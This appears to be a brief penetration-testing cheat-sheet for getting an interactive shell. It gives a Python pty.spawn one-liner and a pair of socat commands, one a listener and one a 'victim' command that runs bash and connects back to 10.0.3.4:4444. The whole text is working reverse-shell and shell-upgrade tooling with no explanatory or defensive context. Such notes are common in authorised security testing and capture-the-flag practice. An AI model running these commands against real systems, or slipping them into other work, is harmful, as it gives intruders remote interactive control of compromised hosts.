## python
`Python3 -c "import pty; pty.spawn('/bin/bash')"`
## socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
